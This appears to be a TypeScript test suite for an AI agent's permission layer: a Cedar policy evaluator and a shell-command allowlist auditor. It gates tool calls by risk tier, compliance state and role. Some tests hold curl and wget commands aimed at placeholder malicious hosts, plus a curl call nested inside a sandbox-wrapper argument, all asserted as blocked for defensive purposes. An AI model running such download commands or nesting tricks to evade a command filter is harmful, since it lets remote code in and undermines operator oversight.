import test from 'node:test';
import assert from 'node:assert';
import * as path from 'node:path';
import * as fs from 'node:fs';
import { CedarEvaluator } from './cedar-evaluator';
import { isCommandLineSecure, parseShellCommand } from './command-auditor';

test('Veritas Cedar Policy & Command Auditor Integration Tests', async (t) => {
  // Load standard policy.cedar from repo root
  const rootPolicyPath = path.resolve(__dirname, '..', '..', '..', 'policy.cedar');
  const evaluator = new CedarEvaluator(rootPolicyPath);

  const defaultCompliantContext = {
    devops: {
      pipeline_passed: true,
      security_audited: true,
      ham_drift_checked: true
    },
    ibp: {
      cross_functional_synthesized: true,
      budget_aligned: true
    },
    plm: {
      active_requirement_id: 'REQ-101',
      associated_tests_written: true,
      has_api_drift: false,
      drift_verified: true,
      release_version_updated: true,
      changelog_updated: true
    }
  };

  await t.test('Parser Bootstrapping', () => {
    assert.ok(evaluator.getRulesCount() > 0, 'Should load and parse policy.cedar rules successfully');
  });

  // TIER 1: Low Risk (Read-Only)
  await t.test('Tier 1: Low Risk - Read-Only tools should be permitted globally', () => {
    const principal = 'sb:issuer:test';
    
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'read_file', { path: 'apps/secure-gateway/src/index.ts' }),
      'allow',
      'read_file should be auto-approved'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'view_file', { path: 'policy.cedar' }),
      'allow',
      'view_file should be auto-approved'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'list_directory', {}),
      'allow',
      'list_directory should be auto-approved'
    );
  });

  // TIER 2: Medium Risk (File Modifications)
  await t.test('Tier 2: Medium Risk - File modifications permitted inside source directories', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'apps/secure-gateway/src/index.ts' }, defaultCompliantContext),
      'allow',
      'write_file inside apps/ should be allowed'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'replace_file_content', { path: 'packages/crypto-utils/src/index.ts' }, defaultCompliantContext),
      'allow',
      'replace_file_content inside packages/ should be allowed'
    );
  });

  await t.test('Tier 2: Medium Risk - File modifications FORBIDDEN on sensitive configurations or policy files', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'policy.cedar' }),
      'deny',
      'Modifying policy.cedar must be forbidden'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'replace_file_content', { path: 'protect-mcp.config.json' }),
      'deny',
      'Modifying protect-mcp.config.json must be forbidden'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'multi_replace_file_content', { path: 'scripts/bootstrap.sh' }),
      'deny',
      'Modifying deployment scripts must be forbidden'
    );
  });

  // TIER 3: High Risk (Command Execution wrappers)
  await t.test('Tier 3: High Risk - Command execution permitted inside sandbox or local CI scripts', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "npm run test" "."' }, defaultCompliantContext),
      'allow',
      'Executing commands via sandbox script should be allowed'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/ci-verify.sh' }, defaultCompliantContext),
      'allow',
      'Executing commands via ci-verify script should be allowed'
    );
  });

  await t.test('Tier 3: High Risk - Raw direct host command execution must be FORBIDDEN', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'npm run test' }),
      'deny',
      'Direct workspace npm executions should be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'ls -la' }),
      'deny',
      'Raw filesystem command executions should be blocked'
    );
  });

  // TIER 4: Critical Risk (Severe Actions)
  await t.test('Tier 4: Critical Risk - Network download and custom package install commands must be blocked', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'curl http://malicious.payload.url' }),
      'deny',
      'curl utility calls must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'wget http://malicious.payload.url' }),
      'deny',
      'wget utility calls must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'npm i lodash' }),
      'deny',
      'npm dynamic package installations must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'pip install cryptography' }),
      'deny',
      'pip package installations must be blocked'
    );
  });

  // COMMAND LINE ALLOWLIST AUDITOR TESTS
  await t.test('Command Line Auditor - Parse shell command arguments securely', () => {
    const parsed = parseShellCommand('bash scripts/sandbox-execute.sh "npm run test" "."');
    assert.deepStrictEqual(
      parsed,
      ['bash', 'scripts/sandbox-execute.sh', 'npm run test', '.'],
      'Should parse standard double-quoted arguments correctly'
    );
  });

  await t.test('Command Line Auditor - Verify allowed commands under allowlist schemas', () => {
    assert.ok(isCommandLineSecure('bash scripts/bootstrap.sh').secure, 'bootstrap.sh script should be allowed');
    assert.ok(isCommandLineSecure('npm run build').secure, 'npm run build should be allowed');
    assert.ok(isCommandLineSecure('npm install').secure, 'bare npm install bootstrap should be allowed');
    assert.ok(isCommandLineSecure('node packages/crypto-utils/dist/index.js --verify receipt.json').secure, 'crypto-utils offline receipt verification should be allowed');
  });

  await t.test('Command Line Auditor - Intercept and block command-matching bypass attempts', () => {
    // 1. Forbidden binaries
    assert.strictEqual(isCommandLineSecure('curl badurl').secure, false, 'Raw curl execution should be blocked');
    assert.strictEqual(isCommandLineSecure('/usr/bin/curl badurl').secure, false, 'Absolute curl path execution should be blocked');
    assert.strictEqual(isCommandLineSecure('curl.exe badurl').secure, false, 'Windows curl.exe format should be blocked');

    // 2. Package install bypasses
    assert.strictEqual(isCommandLineSecure('npm i package-name').secure, false, 'npm install arg short-form should be blocked');
    assert.strictEqual(isCommandLineSecure('npm install package-name').secure, false, 'npm install arg long-form should be blocked');
    assert.strictEqual(isCommandLineSecure('npm add pkg').secure, false, 'npm add should be blocked');

    // 3. Dynamic scripts bypasses
    assert.strictEqual(isCommandLineSecure('bash scripts/malicious.sh').secure, false, 'Non-allowlisted scripts should be blocked');
    
    // 4. Nested command injections in sandbox-execute wrapper
    assert.strictEqual(
      isCommandLineSecure('bash scripts/sandbox-execute.sh "curl malicious.site" "."').secure,
      false,
      'Nested malicious command execution inside sandbox should be successfully audited and blocked'
    );
  });

  // TIER 5: DevOps Compliance Stateful Gating Tests
  await t.test('Tier 5: DevOps Stateful Compliance Verification', () => {
    const principal = 'sb:issuer:test';

    // 1. Blocked when devops state indicates non-compliance
    const nonCompliantContext = {
      devops: {
        pipeline_passed: false,
        security_audited: false,
        ham_drift_checked: false
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, nonCompliantContext),
      'deny',
      'Should forbid committing code if pipeline, security audit, and HAM drift checks have not passed'
    );

    // 2. Allowed when devops state indicates full compliance
    const compliantContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      },
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, compliantContext),
      'allow',
      'Should authorize committing code once all compliance checks pass successfully'
    );
  });

  // TIER 6: Integrated Business Planning (IBP) Stateful Gating Tests
  await t.test('Tier 6: Integrated Business Planning (IBP) Stateful Gates', () => {
    const principal = 'sb:issuer:test';

    // 1. Blocked when IBP synthesis has not been completed
    const nonSynthesizedContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: false,
        budget_aligned: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, nonSynthesizedContext),
      'deny',
      'Should forbid committing code if IBP cross-functional synthesis has not been submitted'
    );

    // 2. Blocked when IBP token budget is exceeded (budget_aligned is false)
    const overBudgetContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: false
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, overBudgetContext),
      'deny',
      'Should forbid executing sandbox operations if IBP token consumption budget is exceeded'
    );

    // 3. Authorized when IBP synthesis is completed and budget is aligned
    const ibpCompliantContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      },
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, ibpCompliantContext),
      'allow',
      'Should authorize committing code once all DevOps and IBP compliance checks pass successfully'
    );
  });

  // TIER 7: Product Lifecycle Management (PLM) Gating Tests
  await t.test('Tier 7: Product Lifecycle Management (PLM) Gates', () => {
    const principal = 'sb:issuer:test';

    // 1. Blocked write operations when active requirement ID is missing/empty
    const missingReqContext = {
      plm: {
        active_requirement_id: '',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'apps/secure-gateway/src/index.ts' }, missingReqContext),
      'deny',
      'Should forbid modifying files if no active requirement ID is set'
    );

    // 2. Blocked commit when tests are not written for modified files
    const noTestsContext = {
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: false,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, noTestsContext),
      'deny',
      'Should forbid committing code if associated tests have not been written/updated'
    );

    // 3. Blocked commit when API/Schema drift has not been verified
    const unverifiedDriftContext = {
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: true,
        drift_verified: false,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, unverifiedDriftContext),
      'deny',
      'Should forbid committing code if active API drift is unverified'
    );

    // 4. Blocked publish when Semantic Version or Changelog are not updated
    const releaseNotUpdatedContext = {
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: false,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "npm publish" "."' }, releaseNotUpdatedContext),
      'deny',
      'Should forbid publishing package if semantic version bump is missing'
    );

    // 5. Allowed when all PLM compliance parameters pass successfully
    const plmCompliantContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      },
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: true,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'apps/secure-gateway/src/index.ts' }, plmCompliantContext),
      'allow',
      'Should permit writing files under compliant PLM state'
    );

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, plmCompliantContext),
      'allow',
      'Should authorize committing code under fully compliant PLM state'
    );

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "npm publish" "."' }, plmCompliantContext),
      'allow',
      'Should authorize publishing package under fully compliant PLM state'
    );

    // 6. Blocked commit when active feedback exists but is not aligned
    const unalignedFeedbackContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      },
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true,
        has_active_feedback: true,
        feedback_aligned: false
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, unalignedFeedbackContext),
      'deny',
      'Should forbid committing code if active feedback is unaligned'
    );

    // 7. Allowed commit when active feedback exists and is aligned
    const alignedFeedbackContext = {
      devops: {
        pipeline_passed: true,
        security_audited: true,
        ham_drift_checked: true
      },
      ibp: {
        cross_functional_synthesized: true,
        budget_aligned: true
      },
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true,
        has_active_feedback: true,
        feedback_aligned: true
      }
    };

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "git commit -m \\"feat: add user schema\\"" "."' }, alignedFeedbackContext),
      'allow',
      'Should authorize committing code once active feedback is aligned'
    );
  });

  // TIER 8: Cryptographic SME Role Gating Tests
  await t.test('Tier 8: Cryptographic SME Role Gating Gates', () => {
    const defaultPLMCompliant = {
      plm: {
        active_requirement_id: 'REQ-101',
        associated_tests_written: true,
        has_api_drift: false,
        drift_verified: true,
        release_version_updated: true,
        changelog_updated: true
      }
    };

    // 1. Backend SME schema boundary
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:backend-sme', 'write_file', { path: 'packages/database/prisma/schema.prisma' }, defaultPLMCompliant),
      'allow',
      'backend-sme principal should be permitted to modify database schema files'
    );
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:frontend-sme', 'write_file', { path: 'packages/database/prisma/schema.prisma' }, defaultPLMCompliant),
      'deny',
      'frontend-sme principal must be blocked from modifying database schema files'
    );

    // 2. Frontend SME dashboard boundary
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:frontend-sme', 'write_file', { path: 'apps/admin-dashboard/src/index.tsx' }, defaultPLMCompliant),
      'allow',
      'frontend-sme principal should be permitted to modify dashboard screen source files'
    );
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:devops-sme', 'write_file', { path: 'apps/admin-dashboard/src/index.tsx' }, defaultPLMCompliant),
      'deny',
      'devops-sme principal must be blocked from modifying dashboard screen source files'
    );

    // 3. QA SME test suite boundary
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:qa-sme', 'write_file', { path: 'apps/secure-gateway/src/cedar.test.ts' }, defaultPLMCompliant),
      'allow',
      'qa-sme principal should be permitted to modify test files'
    );
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:pm-sme', 'write_file', { path: 'apps/secure-gateway/src/cedar.test.ts' }, defaultPLMCompliant),
      'deny',
      'pm-sme principal must be blocked from modifying test files'
    );

    // 4. DevOps SME workflow boundary
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:devops-sme', 'write_file', { path: '.github/workflows/ci.yml' }, defaultPLMCompliant),
      'allow',
      'devops-sme principal should be permitted to modify workflow files'
    );
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:backend-sme', 'write_file', { path: '.github/workflows/ci.yml' }, defaultPLMCompliant),
      'deny',
      'backend-sme principal must be blocked from modifying workflow files'
    );

    // 5. Security SME policy bypass
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:security-sme', 'write_file', { path: 'policy.cedar' }, defaultPLMCompliant),
      'allow',
      'security-sme principal should bypass Tier 2 forbid and modify policy files'
    );
    assert.strictEqual(
      evaluator.isAuthorized('sb:issuer:qa-sme', 'write_file', { path: 'policy.cedar' }, defaultPLMCompliant),
      'deny',
      'qa-sme principal must be blocked from modifying policy files'
    );
  });
});
